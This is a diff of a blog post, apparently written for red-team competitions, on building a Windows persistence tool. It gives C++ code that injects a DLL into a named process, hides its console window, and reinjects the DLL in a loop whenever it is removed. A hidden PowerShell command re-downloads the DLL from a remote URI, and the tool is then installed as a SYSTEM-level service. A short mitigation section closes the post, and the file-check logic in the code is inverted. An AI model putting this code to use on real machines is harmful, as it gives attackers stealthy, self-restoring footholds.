@@ -1,6 +1,7 @@
 # Process Watchdog
 *Writen by: Jon Bauer*
 
+**For any bits of code missing through the post such as includes, visit the project github at:**
 https://github.com/f1rehaz4rd/project link
 
 ## Disclaimer
@@ -91,7 +92,6 @@ Once we are sure that the process is open then we can run all the other commands
     CloseHandle(process);
 ```
 
-Now to where we start the next step, watching the process.
 
 ## The Watching
 So now the question is how do we watch it? We have to make sure that the program never ends by putting it in an infinite while-loop. For performance purposes we do need to put a bit of a sleep on it so that it isn't constantly checking. Plus if someone does end up finding it we don't want the thread to be spun up right away. We want to make them think it is gone before we start another one. For this article we will stick to one process, but you can make it choose from an array of processes at random. 
@@ -104,6 +104,7 @@ So how do we go about doing that. First we need to find out:
 These are all very important for health checks of the program. If one of these doesn't exist the service will not be as strong as it can be. 
 
 ### Finding the Process ID
+---
 If they close the process or restart it will have a different process ID but will always have the same name. For example, cmd.exe. How will this work? There are WINAPIs that will search through the processes running on the system that we can iterate through until we have a match for the name.
 
 For good practice and easy of use I put this code in a function called FindProcessID, which takes in a variable of type const wstring. A wstring is just a special string that the WINAPI uses to interact with the system better. This function will then return a type DWORD which is another one of those fancy WINAPI variables that can be treated like an integer for our purposes.
@@ -146,6 +147,7 @@ DWORD FindProcessId(const std::wstring& processName)
 }
 ```
 ### Checking the Thread
+---
 The injection is now covered along with a way to dynamically find processes IDs by name. Next step in the watchdog process is to verify that the process is still running after we have spun the thread up. 
 
 To do this is actually quite simple. The CreateRemoteThread() function returns the thread handler, which conviently has all of the information that is needed to learn about the thread. Your injection function should return this HANDLE so that it can be used for this step of checking. 
@@ -169,3 +171,203 @@ DWORD IsAlive(HANDLE threadHandle)
 }
 ```
 
+### Checking the System for the DLL
+---
+This is quite simple with C++. We just need to check if the file is on the system with a file stream. This is very easy to find, but I will also prove the code here as well. The tricky part is how to pull down the file if it isn't there? I do this in a very hacked together way with powershell. In the future I plan on doing this more programatically in order to pervent things like powershell being disabled or deleted from stopping the service from pulling the file down.
+
+```
+void checkDLL(const char* dllPath){
+	// Checks if the dll is still on disk
+	FILE* stream;
+	if (fopen_s(&stream, dllPath, "r") != 0) {
+		printf("\t[*] Dll is still on disk\n");
+	}
+	else {
+		// Pull from CDN
+		system("start powershell.exe -w 1 Invoke-WebRequest -Uri \"<URI to pull the file from>" -UseBasicParsing -OutFile C:\\<path and name to place the file>");
+		printf("\t[!] Dll is no longer on disk pulling from <URI>\n");
+	}
+}
+```
+
+### Putting it all together
+---
+Now that all the parts are implemented in code we can put it all together to have an executatble that does the injection and watching for us. The first major barrier has been conquered and here is the final product. Here is the code of everything put together and some images of it loading the DLL.
+
+```
+int main()
+{
+	// Hides the Console Window 
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+	// The path of the DLL to inject
+	const char* dllPath = "C:\\<Path to DLL>";
+	// Name of process to inject into
+	std::wstring targetProcess= L"<Name of Process>";
+
+	// Inject the initial dll
+	printf("[*] Attempting to inject dll: %s\n", dllPath);
+	HANDLE injected = InjectProcess(dllPath, targetProcess);
+	if (injected == 0) {
+		printf("[!] Error: Initial process failed to inject\n");
+	}
+	else {
+		printf("[*] Initial process has been injected\n");
+	}
+
+	// The loop that watches everything
+	while (1) {
+		if (IsAlive(injected) == 0) {
+			printf("[!] Process is no longer injected ... attempting to reinject\n");
+
+			printf("\t[*] Checking if dll is still on disk\n");
+			checkDLL(dllPath)
+
+			printf("\t[*] Attempting to reinject the dll\n");
+			injected = InjectProcess(dllPath, targetProcess);
+			if (injected == 0) {
+				printf("\t[!] Error: Process failed to reinject\n");
+			}
+			else {
+				printf("\t[+] Process has been reinjected");
+			}
+
+		}
+		else {
+			printf("[*] Process is still alive and well\n");
+		}
+		Sleep(5000);
+	}
+	return 0;
+}
+```
+
+--- INSERT PICTURE 2 OF PROCESS BEING INJECTED ---
+
+## Turning it into a Service
+Now that we have an executable that works we can start to build off of it. There are two benifits we are gaining by turning this into a service, but also a draw back. The pros of installing this program as a service is we gain persistence and SYSTEM level access. This allows our program to survive through reboots and be able to start a thread under just about any process on the system. To help mitigate this as a defender really learn what Windows Services shouldn't be there because an attacker will likely do everything that they can to stop you from finding this. 
+
+The only real draw back of this is that you need Administrator privileges or you won't be able to install it. This is ment as a persistent mechanism once access is already gained. This tool was designed for the competition environment so it is assumed that Administrator creds are already provided to you. 
+
+### Brief Summary on Services
+---
+This is a very high level summary so that when you read through the code on your own you have a better idea as of what is happening. There are some things that I do not completely understand myself but have learned through digging through the Mircosoft documentation that I have linked several times through the post.
+
+Overall, for a service to start it needs to communcate with the SCM (Service Control Manager). In Windows this is the thing that controls everything that goes on. If you want to start the service to start you need to inform the SCM that you are in the starting state and wait for it to pass back to you. Same if you want to stop. You send to the SCM that you are going to stop and it will tell you that the service is good to stop.
+
+I don't want to dig into the following code to much because it could be a whole post on its own, but to summarize what it does, it tells the SCM that we are starting a new service and runs the proper functions that will allow for us to start, stop, or suspend the service. Once it is done with that it starts up the PopupThread, which is the main thread for the service where we can put all of our old code into. Boom, now wer have a service that does the same thing as the executable. Installing a Windows Service is quite easy. This is just like doing it with any other but the most simple way to do it is:
+```
+sc.exe CREATE "<Service Name>" binpath="<Path to exe>"
+```
+
+```
+DWORD WINAPI PopupThread(LPVOID lpParameter) {
+	
+	// This is now the main thread of the service
+	// AKA the main where all your code wil be run
+
+	return 0;
+}
+
+VOID ReportServiceStatus(DWORD CurrentState, DWORD Win32ExitCode, DWORD WaitHint) {
+	static DWORD CheckPoint = 1;
+
+	ServiceStatus.dwCurrentState = CurrentState;
+	ServiceStatus.dwWin32ExitCode = Win32ExitCode;
+	ServiceStatus.dwWaitHint = WaitHint;
+
+	if (CurrentState == SERVICE_START_PENDING) {
+		ServiceStatus.dwControlsAccepted = 0;
+	}
+	else {
+		ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+	}
+	if ((CurrentState == SERVICE_RUNNING) ||
+		(CurrentState == SERVICE_STOPPED))
+		ServiceStatus.dwCheckPoint = 0;
+	else ServiceStatus.dwCheckPoint = CheckPoint++;
+
+	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
+}
+
+VOID WINAPI ServiceControlHandler(DWORD Control) {
+	switch (Control)
+	{
+	case SERVICE_CONTROL_STOP:
+		ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
+		SetEvent(ServiceStopEvent);
+		ReportServiceStatus(ServiceStatus.dwCurrentState, NO_ERROR, 0);
+	case SERVICE_CONTROL_INTERROGATE:
+		break;
+
+	default:
+		break;
+	}
+}
+
+VOID ServiceWorker(DWORD Argc, LPTSTR* Argv) {
+	ServiceStopEvent = CreateEvent(
+		NULL,
+		TRUE,
+		FALSE,
+		NULL
+	);
+
+	if (ServiceStopEvent == NULL) {
+		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
+		return;
+	}
+
+	ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);
+
+	DWORD ThreadID;
+	HANDLE myHandle = CreateThread(0, 0, PopupThread, NULL, 0, &ThreadID);
+
+	while (1) {
+		WaitForSingleObject(ServiceStopEvent, INFINITE);
+		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
+		return;
+	}
+}
+
+VOID WINAPI ServiceMain(DWORD Argc, LPTSTR* Argv) {
+	ServiceStatusHandle = RegisterServiceCtrlHandler(
+		ServiceName,
+		ServiceControlHandler
+	);
+
+	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+	ServiceStatus.dwServiceSpecificExitCode = 0;
+
+	ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
+
+	ServiceWorker(Argc, Argv);
+}
+
+int main()
+{
+	SERVICE_TABLE_ENTRY DispatchTable[] = {
+		{(LPWSTR)ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+		{NULL, NULL}
+	};
+	StartServiceCtrlDispatcher(DispatchTable);
+}
+```
+
+## Conclusion
+We now have a really cleaver tool put together for some blue teamers to find in competition. This tool should give you persistence based on what you right for the injected DLL. My plan is to code a DLL which will give me a shell into the system. The real question is how to mitigate this as a blue teamer? 
+
+## Mitigation
+As a blue teamer some good tips to mitigate these attacks is really know your system. Use sysinternals to get a better look at what is running on you machine. Is there anything that looks out of place? Check time stamps on some of the DLLs in important places like C:\Windows directories. Anything that might being used will be newer.
+
+Another way to stop this persistence attack at a high level is to use the firewall. A red teamer might have something like this running on your system, but if there are firewalls to stop it from going out then it might not matter because they can't talk out.
+
+## Troubleshooting Tips
+You might run into some issues that I didn't cover in the explaination above, but there are some of the issues that I ran into while developing this tool.
+
+### Why isn't the thread spinning up even though I have all the code?
+This could be for a couple reasons, but some of the ones you might want to check are as follows:
+* You are running the exe as Administrator or only injecting into a process that is the same or lower integrity level as you.
+* Make sure that both the process, DLL, and executable are all the same build format. For example, they should all be in x64 in my experience to play it save but there are definitely some processes that could handle x86.
+
+### The DLL is injecting but none of my code is running?
+* Make sure that you have a the switch case or DLLs being started as a thread in the DLL. This will be called DLLMain(), just do a quick Google search to find it.
